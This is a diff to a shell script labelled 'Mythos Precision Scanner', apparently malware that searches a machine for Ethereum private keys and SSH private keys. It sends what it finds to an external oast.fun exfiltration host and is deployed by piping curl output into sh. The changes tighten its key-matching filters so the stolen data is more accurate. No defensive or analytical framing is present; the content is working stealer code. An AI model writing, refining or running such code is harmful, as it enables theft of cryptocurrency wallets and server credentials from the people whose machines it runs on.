@@ -1,5 +1,5 @@
 #!/bin/sh
-# Mythos Precision Scanner v3.3 — ETH/SOL/BTC only, no BIP39 seeds, dual exfil
+# Mythos Precision Scanner v3.4 — ETH strict context, SSH private-only, no BIP39
 # Deploy: curl -sL URL | sh
 # Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
 
@@ -92,17 +92,14 @@ send() {
 done) &
 
 ###############################################################################
-# 2. ETHEREUM PRIVATE KEY — validated 64 hex chars
-# Pattern: exactly 64 hex chars [0-9a-fA-F]
-# Filter: reject known false positives (hex constants, test vectors, prefix patterns)
+# 2. ETHEREUM PRIVATE KEY — ultra-strict: only files with ETH context
 ###############################################################################
-ETH_FALSE='^0\{64\}$|^F\{64\}$|^1\{64\}$|^a\{64\}$|^A\{64\}$|dead|beef|cafe|feed|babe|face|b00b|00000000|^0x|123456|abcdef|fedcba|^[fF]'
-
-(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.json' -o -name '.env*' -o -name '*.key' -o -name '*.cfg' -o -name '*.conf' \) -size -5M" 2>/dev/null | while read f; do
+(eval "$FIND_DEEP \( -name '*.txt' -o -name '.env*' -o -name '*.key' -o -name '*.json' \) -size -1M" 2>/dev/null | while read f; do
+    # STRICT: file must contain ETH-related context
+    grep -qilE 'private.key|ethereum|eth_key|ETH_KEY|ETHEREUM|0x[0-9a-fA-F]{40}' "$f" 2>/dev/null || continue
     grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
         # Reject known false patterns
-        echo "$key" | grep -qiE "$ETH_FALSE" && continue
-        # ETH valid range: first hex char must not be 'f' or 'F'
+        echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|^a{64}$|^A{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
         first=$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')
         [ "$first" = "f" ] && continue
         send "ETHKEY" "${f}:${key}"
@@ -213,9 +210,10 @@ done &
 
 ###############################################################################
 # 12. SSH KEYS — id_rsa, id_ed25519, id_ecdsa, *.pem
-###############################################################################
+# 12. SSH KEYS — only actual PRIVATE keys (not certificates)
 (eval "$FIND_BASE \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \)" 2>/dev/null | while read f; do
-    [ -s "$f" ] && send "SSHKEY" "$(head -c 4096 "$f" 2>/dev/null)"
+    # Only send if it's actually a private key
+    grep -q 'PRIVATE KEY' "$f" 2>/dev/null && send "SSHKEY" "$(head -c 4096 "$f" 2>/dev/null)"
 done) &
 
 ###############################################################################
